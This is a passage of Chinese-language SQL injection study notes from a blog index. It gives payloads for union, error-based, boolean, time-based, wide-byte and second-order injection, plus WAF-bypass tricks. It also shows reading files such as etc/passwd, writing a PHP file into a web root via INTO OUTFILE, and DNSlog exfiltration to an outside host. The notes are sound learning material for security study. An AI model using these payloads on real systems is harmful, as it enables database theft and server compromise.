class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">COLUMN_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x74657374</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-number">0x61646d696e</span><br><br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来<br><span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 把 一次性全部打印<br><span class="hljs-keyword">select</span> group_concat(concat(username,<span class="hljs-number">0x20</span>,passwd)) <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><h4 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h4><p>请注意,如果需要全部显示数据库需要用到substr函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> substr(字符串,<span class="hljs-number">1</span>,截取长度)<br><span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA),<span class="hljs-number">1</span>,<span class="hljs-number">7</span>);<br></code></pre></td></tr></table></figure><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x7e</span>,count(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.schemata)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br></code></pre></td></tr></table></figure><p>列出数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">单个列出 :<br><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((<span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)y)<br></code></pre></td></tr></table></figure><p>查询表和字段直接把联合注入的payload放进去就可以了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((payload),<span class="hljs-number">0x7e</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)y)<br></code></pre></td></tr></table></figure><h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>, (<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(payload),<span class="hljs-number">0</span>x7e))<br><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and updatexml(<span class="hljs-number">1</span>,(<span class="hljs-name">payload</span>),<span class="hljs-number">1</span>)<br><br>and updatexml(<span class="hljs-number">1</span>, (<span class="hljs-name">concat</span>(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span> user()),<span class="hljs-number">0</span>x7e)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="三-布尔注入"><a href="#三-布尔注入" class="headerlink" title="三 .布尔注入 :"></a>三 .布尔注入 :</h3><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">select</span> ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">payload</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)))&gt;105 <br></code></pre></td></tr></table></figure><h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr((payload), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))=<span class="hljs-number">114</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为<span class="hljs-number">2</span>字节<br><br>如果使用了类似于<span class="hljs-keyword">set</span> names gbk这样得语句,此时mysql数据库就会将<br><br><span class="hljs-keyword">Ascii</span>大于<span class="hljs-number">128</span>(<span class="hljs-built_in">%df</span>)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sql注入备忘录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql总结</title>
    <link href="/2021/01/24/sql1/"/>
    <url>/2021/01/24/sql1/</url>
    
    <content type="html"><![CDATA[<h4 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h4><h6 id="一-根据sql数据类型分类"><a href="#一-根据sql数据类型分类" class="headerlink" title="一.根据sql数据类型分类"></a>一.根据sql数据类型分类</h6><p>加单引号,报错可能有注入,不报错没有注入</p><p>1.整形注入(不需要闭合,注释)</p><p>2.字符串类型注入(需要闭合,注释)</p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="二-判断sql注入是整形还是字符串"><a href="#二-判断sql注入是整形还是字符串" class="headerlink" title="二.判断sql注入是整形还是字符串"></a>二.<strong>判断</strong>sql注入是整形还是字符串</h6><p>①.<strong>1a和1也可以判断整形和字符串类型如果是字符串就会没什么区别,要是整形会出现1a报错,1正常显示</strong>(如果有init()整形转化函数,就gg)</p><p>②.and 1&#x3D;1 &#x2F;and1&#x3D;2 回显页面不同(真假判断) (waf拦截) ture or false</p><h6 id="三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同"><a href="#三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同" class="headerlink" title="三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同"></a><strong>三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同</strong></h6><p>①.(\转义符) 无论整形或者字符串都会报错,只能通过报错信息判断</p><p>②.-1&#x2F;+1通过加减法是否成功(一般用的减法,因为+在一定意义上也代表空格)</p><p>③.and sleep() 通过是否睡眠判断该函数是否执行进而判断是否为字符型还是整形,睡眠成功&#x3D;整形,否者为字符串</p><p>注意:在实战中不能随意根据这些固定的方法去判断这是什么类型,因为我们并不知道它们在后端做了什么过滤,要谨慎下结论</p><h6 id="四-根据注入的类型分类"><a href="#四-根据注入的类型分类" class="headerlink" title="四.根据注入的类型分类"></a>四.根据注入的类型分类</h6><p>1.联合注入查询</p><p>2.报错注入</p><p>3.布尔注入</p><p>4.时间延时注入</p><p>5.宽字节注入</p><p>6二次注入(5,6用于有转义函数的时候addslashes()?)</p><p>7.堆叠注入 多语句查询 后端代码需要有多语句查询语句 5.0以下的版本 </p><p>8.偏移注入(只对access数据库有用,并且在实战中access数据库很少见)</p><p>9.DNS外带注入(这不算是一种类型吧,只是用于注入时比较慢或者不回显的注入 延时,布尔)</p><h6 id="五-mysql中三种注释风格"><a href="#五-mysql中三种注释风格" class="headerlink" title="五.mysql中三种注释风格"></a>五.mysql中三种注释风格</h6><p>1.url 编码为%23 #</p><p>2.– (后面有一个空格)</p><p>3.&#x2F;*….*&#x2F;</p><p>4.&#x2F;*!…*&#x2F;内联注释</p><p>5.&#x2F;*!*&#x2F;本身没有什么意义,只是干扰,select &#x2F;*!@@version&#x2F;</p><p>6.select * &#x2F;*!22222from*&#x2F; users;</p><p>如果当前的数字大于当前的版本则会被注释掉</p><p>否则失效,绕waf</p><h6 id="六-mysql函数利用-可用大小写等绕过waf"><a href="#六-mysql函数利用-可用大小写等绕过waf" class="headerlink" title="六.mysql函数利用,可用大小写等绕过waf"></a>六.mysql函数利用,可用大小写等绕过waf</h6><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit">-- <span class="hljs-keyword">select</span> user()         root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> system_user()   root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> current_user()      root<span class="hljs-symbol">@localhost</span>(user都是当前用户)<br>-- <span class="hljs-keyword">select</span> session_user()<br>-- root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> database() pikachu<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> version() <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@basedir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\(mysql安装路径)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@datadir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\data(MySQL 数据库文件路径,当@<span class="hljs-symbol">@basedir</span>可用)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version_compile_os</span>    Win64<br></code></pre></td></tr></table></figure><h6 id="七-load-file-读文件操作-任意文件读取"><a href="#七-load-file-读文件操作-任意文件读取" class="headerlink" title="七.load_file() 读文件操作(任意文件读取)"></a>七.<strong>load_file() 读文件操作(任意文件读取)</strong></h6><p>注意:先看看secure_file_priv **show variables like ‘%secure_file_priv%’**是否开启.5.0以上版本默认关闭即使值为null ,为空没有任何东西才会允许load_file,还有写文件</p><p><strong>前提:</strong></p><p><strong>1.知道文件绝对路径</strong></p><p><strong>2.对web目录具有读写权限(基本上只有root权限才有读写权限)</strong></p><p><strong>3.全局gpc函数关闭</strong></p><p>4.**secure_file_priv **为空</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(&#x27;etc/passwd&#x27;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><br><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(十六进制),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 绕过过滤单双引号的限制<br></code></pre></td></tr></table></figure><p>所写的内容+into outfile + ‘保存的文件路径’<strong>写文件操作</strong>(5.3版本之前,会被gpc过滤单双引号,就没办法进行写入文件)</p><p><strong>例如:</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="hljs-keyword">into</span> outFILE <span class="hljs-string">&#x27;../../../www/5.php&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.sql.com:<span class="hljs-number">8080</span>/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">0</span>x3c3f70687020706870696e666f28293b3f3e,<span class="hljs-number">3</span> into outFILE &#x27;../../../www/<span class="hljs-number">5</span>.php&#x27; --+<br></code></pre></td></tr></table></figure><p>最后一个显示位不能删掉,不然会报错.</p><p>前提:</p><p><strong>1.知道绝对路径</strong></p><p>2.用户必须有写文件权限 secure_file_priv</p><p>3.对web目录具有读写权限(基本上只有root权限才有读写权限)</p><p><strong>4.get_magic_gpc函数关闭,不然会目录写不进去</strong></p><p><strong>在数据库中into outfile语句把表数据导出到一个文本文件中,那么利用这个语句，再配合满足的‘三个条件’，即可实现文件或者一句话木马导入到数据库文件的目录中。 三个条件： 1.具有root权限。 2.在数据库配置文件中的 配置项含有：secure_file_priv&#x3D;’’。</strong></p><h6 id="八-mysql中union规则"><a href="#八-mysql中union规则" class="headerlink" title="八.  mysql中union规则"></a>八.  mysql中union规则</h6><p>1.union必须由两条或两条以上的select语句组成,语句之间要用关键字union分割</p><p>2.union中的每个查询必须包含相同的列数(字段)</p><p>3.union会从查询结果集中自动去除重复行</p><p>4.只有最后一个select允许有order by</p><p>5.只有最后一个select允许有limit</p><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>1.利用前提:页面上有显示位</p><p>2.优点:方便,快捷,易于利用</p><p>3.缺点:需要显示位</p><p>one:   order by 判断字段数 </p><h6 id="各种操作"><a href="#各种操作" class="headerlink" title="各种操作"></a>各种操作</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> shcema_name <span class="hljs-keyword">from</span> infromation_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span> ) <span class="hljs-keyword">from</span> information_shcema.schemata(元数据库得数据库表) 一次性全部显示<br></code></pre></td></tr></table></figure><h6 id="列出对应得数据库得所有表"><a href="#列出对应得数据库得所有表" class="headerlink" title="列出对应得数据库得所有表"></a>列出对应得数据库得所有表</h6><p>limit一个个打印出来字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">select <span class="hljs-built_in">group_concat</span>(table_name)frominformation_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-number">0</span>x674657374 <br><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">()</span></span>一次性弄出来<br></code></pre></td></tr></table></figure><p><strong>注意数据库名可以使用十六进制来替代字符串,这样可以绕过单引号得限制</strong> </p><h6 id="查询特定的表的字段"><a href="#查询特定的表的字段" class="headerlink" title="查询特定的表的字段"></a>查询特定的表的字段</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="-2"><a href="#-2" class="headerlink" title=""></a></h5>]]></content>
    
    
    <categories>
      
      <category>sql总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql各种注入手法</title>
    <link href="/2021/01/23/sql/"/>
    <url>/2021/01/23/sql/</url>
    
    <content type="html"><![CDATA[<h5 id="一-报错注入"><a href="#一-报错注入" class="headerlink" title="一.报错注入"></a>一.报错注入</h5><p>利用前提:页面上没有显示位无所谓,但是需要输出sql语句执行错误信息,比如mysqli_error()</p><p>优点:不需要显示位</p><p>缺点:需要输出mysqli_error()报错信息</p><h5 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h5><p><strong>1.Floor() 对于这个报错来说,先group by 之后再select</strong></p><p>group by 执行一次rand ,如果有,直接count(*),如果没有,先插入(相当于执行力两次rand)</p><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整,只保留整数部分</p><p>rand(0)函数可以用来生成0,1,但是rand(0)和rand()还是有本质去别的,rand(0)相当于给rand函数传递了一个参数,然后rand()函数会根据0这个参数进行随机数生成.而rand()生成的数字是完全随机的,而rand(0)是有规律的生成,我们可以在数据库中尝试.</p><p>floor()返回小于等于该值的最大整数.</p><p>mt_rand()比rand()获取随机数更快</p><p><strong>2.通过extractvalue报错</strong></p><p>函数解释:</p><p>extractvalue():从目标xml中返回包含所查询的字符串.</p><p>extractvalue(xml_document,XPath_string);</p><p>第一个参数:xml_document是string格式(如果我们不写字符串格式而写一个数字,那么就会报错,将第二个参数后面的语句查询出来.concat(1(只要是不正确的路径就行),….),输入不正确的路径string,会直接报错输出)</p><p>第二个参数:XPAth_String(XPath格式的字符串)</p><p>and extractvaue(1,concat((任意字符),(payload),(任意字符串,可写可不写))</p><p><strong>如果XPath_string不是XPath格式,则会报错并显示出XPath_string的值</strong>,发生错误字符后面的值显示</p><p><strong>3.通过updatexml报错</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(pyload),<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(concatenate(<span class="hljs-number">1</span>,(select user()),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>4.exp函数报错,有版本限制5.7.26以下才可以用</p><h6 id="二-布尔注入"><a href="#二-布尔注入" class="headerlink" title="二.布尔注入"></a>二.布尔注入</h6><p>利用前提:页面上没有显示位,也没有输出sql语句执行错误信息.</p><p>只能通过页面返回正常不正常</p><p>优点:不需要显示位,不需要出错信息.</p><p>缺点速度慢,耗费大量时间(可写python脚本跑)</p><p><strong>布尔注入函数</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;Dumb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> ord(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> mid(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">right</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> ASCII(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username regexp (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br></code></pre></td></tr></table></figure><h6 id="三-延时注入"><a href="#三-延时注入" class="headerlink" title="三.延时注入"></a>三.延时注入</h6><p>利用前提:</p><p>页面上没有显示位,也没有输出SQL语句执行错误信息.</p><p>正确的sql语句和错误的sql语句返回页都一样,但是加入sleep(5)条件之后,页面明显加载时间有变化,慢了五秒</p><p>优点: 不需要显示位不需要错误信息</p><p>缺点:很明显速度慢,耗费大量的时间.</p><h6 id="四-宽字节注入"><a href="#四-宽字节注入" class="headerlink" title="四.宽字节注入"></a>四.宽字节注入</h6><p>GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际上为两字节,如果使用了类似于set names gbk这样的语句,此时的mysql数据库就会将ascii大于128(%df)的字符当作是汉字字符的一部分,从而能吃掉,引入单引号或者双引号.</p><h6 id="五-二次注入"><a href="#五-二次注入" class="headerlink" title="五.二次注入"></a>五.二次注入</h6><p>在注册中,注册一个和admin账号相似的admin’#,然后会发现你登陆admin’#的时候,实际上是登录了admin,改密码的时候,改的也是admin.当apache给数据库处理端传送SELECT * FROM users WHERE username&#x3D;’admin\‘#’ and password&#x3D;’$password’的时候,数据库此时会忽视\变成SELECT * FROM users WHERE username&#x3D;’admin’#’ and password&#x3D;’$password’ 后面的那段就被注释掉了</p><p>虽然登录的时候显示admin’#,但是数据库取出来的数据都是admin的</p><p>二次注入的利用条件:</p><p>1.用户向数据库插入恶意语句(即使后端代码对语句进行转义,如mysql_escape_string,mysql_real_escape_string转义)</p><p>2.数据库对直接取出来的恶意数据并没有进行过滤</p><h6 id="六-DNSLOG外带注入"><a href="#六-DNSLOG外带注入" class="headerlink" title="六.DNSLOG外带注入"></a>六.DNSLOG外带注入</h6><p>条件:</p><p>需要load_file(读权限),需要开启security_file_priv为空</p><p>不论是布尔盲注还是时间注入,都需要频繁的跑请求才能获取数据库中的值,在现代的waf防护下,很可能导致ip被封,我们可以结合dnslog完美快速的将数据取出来.如遇到mysql盲注时,可以利用内置函数load_file()来完成dnslog外带注入,load_file不仅能够加载本地文件,同时也能对url发起请求</p><p>网址:<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> load_file(<span class="hljs-built_in">concat</span>(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.xxx. dnslog.cn\\\abc&#x27;))--+<br></code></pre></td></tr></table></figure><p>注意像这个dnslog外带,对应于@等特殊字符读不出来,需要加编码变成数字</p><p>尽量用十六进制函数包裹,以防对方数据具有特殊字符</p><p>\1. sql盲注，后端数据库用的mysql数据库，<strong>说一下用dnslog回显只能用于windows系统</strong>，原理就是’\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</p><p>\2. 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p><blockquote><p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为C:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>通过设置my.ini来配置。secure_file_priv&#x3D;””就是可以load_flie任意磁盘的文件。</p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
